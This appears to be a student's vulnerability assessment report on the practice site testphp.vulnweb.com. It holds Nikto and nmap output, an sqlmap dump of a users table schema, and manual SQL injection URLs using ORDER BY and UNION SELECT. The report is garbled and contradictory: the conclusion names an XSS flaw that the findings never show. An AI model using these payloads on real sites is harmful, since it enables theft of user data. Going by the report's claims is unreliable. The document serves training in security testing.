http://testphp.vulnweb.com/

Do a vulnerability assessment of this website and create report and commit to the this repo at in task-0 for along with your learning circle ID.

cybergooys vulnerability assessment



This vulnerability assessment report was conducted on the web application http://testphp.vulnweb.com/. The assessment was conducted using a variety of tools and techniques, including sqlmap,nikito,manually injection  of SQL The assessment identified a number of vulnerabilities, SQL injection. The most severe vulnerability identified was a SQL injection vulnerability that could allow an attacker to inject sql code into the steal information  and steal user details like email password phonenumber.

*Introduction*

The objective of this vulnerability assessment was to identify and assess the security risks associated with the web application http://testphp.vulnweb.com/. The assessment was conducted in accordance with the Open Web Application Security Project (OWASP) Testing Guide.

*Methodology*

The following tools and techniques were used to conduct the vulnerability assessment:

* **sqlmap :A tool used for injecting SQL injection and getting the database by columns etc.
* *Nikto:* A network security scanner that identifies and assesses vulnerabilities in web servers and other network devices.
* **nmap:A network security scanner that identifies and assesses vulnerabilities in web servers and other network devices.

*Findings*

The following vulnerabilities were identified during the vulnerability assessment:

*Getting database from acart 
*Adding new new images to the poster
*


*Conclusion*

This vulnerability assessment identified a number of security risks associated with the web application http://testphp.vulnweb.com/. The most severe vulnerability identified was a critical XSS vulnerability that could allow an attacker to inject malicious code into the web application and steal user cookies or session tokens. The web application owner should take immediate steps to remediate the identified vulnerabilities.

*Appendix*

mapDatabase: acuart
Table: users
[8 columns]
+---------+--------------+
| Column  | Type         |
+---------+--------------+
| name    | varchar(100) |
| address | mediumtext   |
| cart    | varchar(100) |
| cc      | varchar(100) |
| email   | varchar(100) |
| pass    | varchar(100) |
| phone   | varchar(100) |
| uname   | varchar(100) |
+---------+--------------+

(sarfas㉿kali)-[~]
└─$ nikto -url http://testphp.vulnweb.com  
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Multiple IPs found: 44.228.249.3, 64:ff9b::2ce4:f903
+ Target IP:          44.228.249.3
+ Target Hostname:    testphp.vulnweb.com
+ Target Port:        80
+ Start Time:         2023-11-17 01:05:16 (GMT5.5)
---------------------------------------------------------------------------
+ Server: nginx/1.19.0
+ /: Retrieved x-powered-by header: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/


injecting sql manually 

http://testphp.vulnweb.com/listproducts.php?cat=1 order by 15
Error: Unknown column '15' in 'order clause' Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74 

http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%201,2,3,4,5,6,database(),8,9,10,11

added a new poster to it 

nmap scan 

└─$ nmap -v -A 44.228.249.3~
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-17 01:46 IST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 01:46
Completed NSE at 01:46, 0.00s elapsed
Initiating NSE at 01:46
Completed NSE at 01:46, 0.00s elapsed
Initiating NSE at 01:46
Completed NSE at 01:46, 0.00s elapsed
Failed to resolve "44.228.249.3~".
NSE: Script Post-scanning.
Initiating NSE at 01:46
Completed NSE at 01:46, 0.00s elapsed
Initiating NSE at 01:46
Completed NSE at 01:46, 0.00s elapsed
Initiating NSE at 01:46
Completed NSE at 01:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 1.28 seconds
